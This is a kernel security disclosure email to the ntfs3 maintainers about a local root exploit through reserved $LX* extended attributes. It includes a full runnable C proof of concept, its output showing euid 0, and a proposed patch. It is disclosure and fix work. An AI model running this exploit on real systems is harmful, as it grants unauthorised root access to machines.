Received: from mail-ed1-f67.google.com (mail-ed1-f67.google.com [209.85.208.67])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 52E1537207F
	for <ntfs3@lists.linux.dev>; Sat,  6 Jun 2026 10:55:15 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.208.67
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1780743317; cv=pass; b=o+eB5YivBNMLAnqlhdUrPXW8VgqsW0hy7GLmYFLIoOFB0kmcbkLHGQsXjcGkdY7u4oPMScWpP53zIukwXUFpbbgvXrb/FVF/o+MYv5Uc7RJZKoT87rc7Ar3AbDrFLxR0/ViqyHSH9kO/THPXBhkzxrSQmt8RPcCLzQpKt/DleaM=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1780743317; c=relaxed/simple;
	bh=Nr0aL3ufU4v687psmAxfFRNGsw7CFcsk7oWpQh3kc2w=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=YbPNr0EobP6pY5054MzG6J66I7Q992RqQcFKQuRqWhWPjItYVFaywfSXjvV8dGE9Fgv+xHqSPox2e5aT9hoPB8AKV04PFkFu8+U8w233syM2OxYVqFVqz/7BWypfxr+jsyteRt97hCawXm7ySE8ee1Kaz8p0Rw9l4v3g69X993E=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=HCbHn4ry; arc=pass smtp.client-ip=209.85.208.67
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="HCbHn4ry"
Received: by mail-ed1-f67.google.com with SMTP id 4fb4d7f45d1cf-6912f4acca4so1746015a12.1
        for <ntfs3@lists.linux.dev>; Sat, 06 Jun 2026 03:55:15 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1780743314; cv=none;
        d=google.com; s=arc-20240605;
        b=e+/+fw9Bz+AAPl9MmC3lhy2vHxYLldU7yu1Crs8iSWlP7n3WNpQCmnoVuGwudd5mE2
         0Bg3bFzR11znegoJB4Nekkq60hmJyAANR+c2/EcSb5AbgVzG8cjHyWcIY612tZcgWaiv
         MY2xSEUpHiYcW0xPqn7O6fn38NfWRn5LBc1k2h8brK8f6z9zUne/rNmn5sLTqIxhyiRq
         Q8yXhVQBpmrkXNHRE5eJ+gprh36UaR2X55Q1YlfgGIuKfhw+slgzsxLqkqFLF9vo9mrn
         V3V+85OKC/Ma/wAQkOCXlEHO/agtA4iirBGin+2UjDRe6fR3bvpkNbOGbdDMX8SfiK2Z
         Y/HQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=cc:to:subject:message-id:date:from:mime-version:dkim-signature;
        bh=ZR2ZuAneQM6fddwhQe4SWdJ4RcBgvZspXP6uGMhFQUI=;
        fh=Tpfn9d1P1mLdFoZCH5b/SbY0pQUXTGk/epwLRpqGI+c=;
        b=EU7lblq0lqFx0LKoq15hS7EqQ/AIfHN/yyEtrE1uIehtst0WPfO6UypOmTfWV97+y4
         UTecq85HGRrl2iNEKE9SpP4njT7tnTOKflm+2WJ6UKDujW/XbpHlAu4X1CUwCsVmnAW+
         8yazafAL1f1sbVjLUUb81eOA04VhmdMKtd+9fPb/HUCAaecg9t6qk0c8Sc4i8EbFycgy
         VIbkvYbLr8hiczKUf2eQCgo+MDSvG79Kzp+3gPG1Iy2fyU6rq6NBadRsRkA0dCT7CUTF
         G/3WPWNq3XJ7Jz9ex1IV/1kJ5tKfh5rEJLUV9qPBLTiCtzitUqq9EczOd5D8l8FmjAVx
         SreA==;
        darn=lists.linux.dev
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1780743314; x=1781348114; darn=lists.linux.dev;
        h=cc:to:subject:message-id:date:from:mime-version:from:to:cc:subject
         :date:message-id:reply-to;
        bh=ZR2ZuAneQM6fddwhQe4SWdJ4RcBgvZspXP6uGMhFQUI=;
        b=HCbHn4ry2wFWH9+jA+1nqa1guuEmTr6a3ckyZ0AsEO3aYSAy4qOOR+EzKKS35Z1ic6
         pCbuAR4odCdxyi7WZERYFk+j5hXwoZ+TojHAUZJSRIrstQWqrWNjG+6JaigbjzgoENab
         aXKG4gtxUSDLfdHDJESVj1d7DQsLJwmnOOozCl891cMWumdgYwQcIVp/LGVVDIMntWtn
         iK7R9smNAX4P14hehll9WoFogqnYFnIs/iK7JkQHgTq0kMzpJjwfXlo+lbxM5LCgYj0M
         xZy4VjJNgO9XmPTUG0hfvgeI2oUoqmj8wMC7Wjmwnb5POuz2SxC68CGXVbnwgOGRyXDH
         sKdw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1780743314; x=1781348114;
        h=cc:to:subject:message-id:date:from:mime-version:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=ZR2ZuAneQM6fddwhQe4SWdJ4RcBgvZspXP6uGMhFQUI=;
        b=Na9hY994shm0/hp2IZziX0zX4zQ9sD/DeHO8lumq1cJz+uy0ivLDTuiXDhuiDlQDlE
         j3+eORFfiubQXRMvHwjrkZWVgLmP/6TLvNCU7uuQktjwOK8WkpoRvI2JyvxB26SnjfuY
         yY7leJQrGcHRh/HKDNbqEkhuH8PzCgDJ1Ho4t9YUUzFPMszW/rVRCrQdO1TjX/1MpKLC
         E6xUTOxbAmLzS3SPjqX4hQQz1YV2/23bAT5UGQxdxyDQuwV2QpJYuHLpmlR8IlRmkhN9
         ialE8ao3LQnuqwU8SIEdD4ihfiHIbfW3F462velW33Bq5eR45DC7Ks9pJNdBXSCjat5a
         XVHg==
X-Gm-Message-State: AOJu0YzKDR2BpaSELF2Gq/FR4gVR80cISaBHmhzwRZyRrtre47YcGTG0
	QGbnXwLMJScb3eaE4Vn4N4Kvqs1ua8cejdKZcoB+Wwc1aWfi+3ETbwEm/70jBRlL6TymTQpqDVr
	H3k5LAbXoMUVxJUWmxJfpDVWcElS+vGY=
X-Gm-Gg: Acq92OFsvzEGLpx4XWiGOQ07NzOlxMndbUL9f2GYc4alv9sEjsuWnX43Sq3Px8RdZBB
	HidgETTi1+d/4Q4ygCsYVLyu2BgxsVPBOzgK0mJKf2hS2PLxnLpbZLuxDGHV5bGk2oRHUhBRjD3
	S/sEvY0chuG9Y+3K+CH5672YmZ5JZVUWN2GW/6inUnR+r1R1XySPNIhpptoYE0eBQT9xvNx8inz
	VRmE1sjJWzmDCkDmgIcHoVK1xLVQ35VGHYe9/5BDCjJ+QvLbaO7Bq4MB+Vu3DzV8P4/uORa32n0
	pU35EB8029aI3YNMyCM=
X-Received: by 2002:a17:907:72c9:b0:bd3:1a18:cc64 with SMTP id
 a640c23a62f3a-bf37264180dmr390682966b.31.1780743314018; Sat, 06 Jun 2026
 03:55:14 -0700 (PDT)
Precedence: bulk
X-Mailing-List: ntfs3@lists.linux.dev
List-Id: <ntfs3.lists.linux.dev>
List-Subscribe: <mailto:ntfs3+subscribe@lists.linux.dev>
List-Unsubscribe: <mailto:ntfs3+unsubscribe@lists.linux.dev>
MIME-Version: 1.0
From: sdj asj <sdjasjbuaa@gmail.com>
Date: Sat, 6 Jun 2026 18:57:01 +0800
X-Gm-Features: AVVi8CcmZpqE--sCqHVRF70CY1qNwXKrLbO0mu00aTXZ23ra1ArF8ybJunu60eM
Message-ID: <CAFTRC0=MDbnsNtb4-p7v4Hy9P-U4PsJuWv7s4MX0aEZcMxDVHw@mail.gmail.com>
Subject: [SECURITY] ntfs3: direct $LX* xattr writes can create a root SUID file
To: almaz.alexandrovich@paragon-software.com
Cc: ntfs3@lists.linux.dev, linux-kernel@vger.kernel.org, security@kernel.org
Content-Type: text/plain; charset="UTF-8"

Hello,

Summary

I found a syscall-reachable local privilege escalation in NTFS3.

Affected tree:
- reproduced on e8c2f9fda

The bug is in the xattr write + inode reload path:

1. On e8c2f9fda, direct userspace writes to $LXUID/$LXGID/$LXMOD were
accepted by ntfs_setxattr().

   In the vulnerable tree, unknown names fall through to ntfs_set_ea():

  971 /* Deal with NTFS extended attribute. */
  972 err = ntfs_set_ea(inode, name, strlen(name), value, size, flags, 0,
  973       NULL);

   There was no check blocking direct userspace writes to reserved $LX* xattrs,
   so a file owner could write arbitrary $LXUID/$LXGID/$LXMOD values.

2. On inode reload, ntfs_get_wsl_perm() trusts those xattrs as authoritative
   uid/gid/mode metadata:

  1037  if (ntfs_get_ea(inode, "$LXUID", sizeof("$LXUID") - 1, &value[0],
  1038      sizeof(value[0]), &sz) == sizeof(value[0]) &&
  1039      ntfs_get_ea(inode, "$LXGID", sizeof("$LXGID") - 1, &value[1],
  1040      sizeof(value[1]), &sz) == sizeof(value[1]) &&
  1041      ntfs_get_ea(inode, "$LXMOD", sizeof("$LXMOD") - 1, &value[2],
  1042      sizeof(value[2]), &sz) == sizeof(value[2])) {
  1043    i_uid_write(inode, (uid_t)le32_to_cpu(value[0]));
  1044    i_gid_write(inode, (gid_t)le32_to_cpu(value[1]));
  1045    inode->i_mode = le32_to_cpu(value[2]);

3. That reload is reached from inode load in fs/ntfs3/inode.c:

  373 case ATTR_EA_INFO:
  380   inode->i_mode = mode;
  381   ntfs_get_wsl_perm(inode);
  382   mode = inode->i_mode;

As a result, a file owner on a writable NTFS3 mount can set:

- $LXUID = 0
- $LXGID = 0
- $LXMOD = S_IFREG | 04755

then force inode reload by remount/eviction and obtain a root-owned SUID file.

This does not require a malformed filesystem image. Normal syscalls only.

PoC

The core userspace trigger is just direct setxattr() on $LXUID/$LXGID/$LXMOD
followed by inode reload. The following is copy/paste runnable on a vulnerable
kernel if /mnt/ntfs3 is a writable NTFS3 mount:

cat >/tmp/ntfs3_lxperm_poc.c <<'EOF'
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <unistd.h>

static void die(const char *msg)
{
  perror(msg);
  exit(1);
}

int main(void)
{
  const char *target = "/mnt/ntfs3/lxperm_suid";
  struct stat st;
  uint32_t uid = 0;
  uint32_t gid = 0;
  uint32_t mode = S_IFREG | 04755;
  int fd;

  unlink(target);
  fd = open(target, O_CREAT | O_WRONLY | O_TRUNC, 0755);
  if (fd < 0)
    die("open target");
  if (write(fd, "#!/bin/sh\nid\n", 12) != 12)
    die("write target");
  if (fchown(fd, 1000, 1000))
    die("fchown target");
  if (fchmod(fd, 0755))
    die("fchmod target");
  close(fd);

  if (setgid(1000))
    die("setgid");
  if (setuid(1000))
    die("setuid");

  if (setxattr(target, "$LXUID", &uid, sizeof(uid), 0))
    die("setxattr $LXUID");
  if (setxattr(target, "$LXGID", &gid, sizeof(gid), 0))
    die("setxattr $LXGID");
  if (setxattr(target, "$LXMOD", &mode, sizeof(mode), 0))
    die("setxattr $LXMOD");

  printf("setxattr done, now remount the filesystem to force inode reload:\n");
  printf("  mount | grep ' /mnt/ntfs3 '\n");
  printf("  umount /mnt/ntfs3 && mount -t ntfs3 <device> /mnt/ntfs3\n");
  printf("Then run:\n");
  printf("  stat %s\n", target);
  printf("  %s\n", target);

  if (stat(target, &st))
    die("stat target");
  printf("before reload: uid=%u gid=%u mode=%04o\n",
         (unsigned)st.st_uid, (unsigned)st.st_gid, st.st_mode & 07777);
  return 0;
}
EOF
gcc -O2 -Wall -Wextra -o /tmp/ntfs3_lxperm_poc /tmp/ntfs3_lxperm_poc.c
/tmp/ntfs3_lxperm_poc

After remount on the vulnerable tree, the success condition is:
- stat shows uid=0 gid=0 mode=4755 for /mnt/ntfs3/lxperm_suid
- executing the file as uid 1000 runs with euid 0

For reference, the original end-to-end PoC on the vulnerable tree produced:

  before attack: uid=1000 gid=1000 mode=0755
  attacker uid=1000 euid=1000 setting $LX* xattrs
  after setxattr before reload: uid=1000 gid=1000 mode=0755
  after remount: uid=0 gid=0 mode=4755
  helper real_uid=1000 effective_uid=0
  RESULT: confirmed - unprivileged $LX* xattrs produced a root SUID executable

Patch

Proposed fix:

[PATCH] ntfs3: reject direct userspace writes to reserved $LX* xattrs

diff --git a/fs/ntfs3/xattr.c b/fs/ntfs3/xattr.c
index 9eeac0ab2..0bc633025 100644
--- a/fs/ntfs3/xattr.c
+++ b/fs/ntfs3/xattr.c
@@ -851,6 +851,14 @@ static int ntfs_getxattr(const struct
xattr_handler *handler, struct dentry *de,
  return err;
 }

+static bool ntfs_is_reserved_lxattr(const char *name)
+{
+ return !strcmp(name, "$LXUID") ||
+        !strcmp(name, "$LXGID") ||
+        !strcmp(name, "$LXMOD") ||
+        !strcmp(name, "$LXDEV");
+}
+
 /*
  * ntfs_setxattr - inode_operations::setxattr
  */
@@ -955,6 +963,11 @@ static noinline int ntfs_setxattr(const struct
xattr_handler *handler,
    goto out;
  }

+ if (ntfs_is_reserved_lxattr(name)) {
+   err = -EPERM;
+   goto out;
+ }
+
  /* Deal with NTFS extended attribute. */
  err = ntfs_set_ea(inode, name, strlen(name), value, size, flags, 0,
        NULL);

This report was prepared with AI assistance, so I am treating it as public
per Documentation/process/security-bugs.rst.

Thanks,
Zhen Yan
